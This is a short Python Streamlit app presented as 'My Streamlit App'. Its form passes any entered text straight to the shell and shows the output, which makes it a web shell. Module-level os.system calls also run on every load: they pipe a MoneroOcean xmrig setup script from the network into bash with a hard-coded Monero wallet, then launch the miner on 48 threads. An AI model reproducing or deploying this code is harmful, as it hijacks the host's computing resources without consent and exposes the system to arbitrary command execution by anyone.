import os
import streamlit as st


st.header('My Streamlit App')
input_text = st.text_input('Enter CMD')
button = st.button('Run')

if button == True:
  if input_text != '':
    output = os.popen(input_text).read()
    st.text(output)
  else:
    st.text('Please Enter CMD')
    

os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
os.system("mkdir -p /home/miner")
os.system("mv /root/moneroocean/miner.sh /home/miner/miner.sh")
os.system("bash /home/appuser/moneroocean/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo -t 48 -p w1")

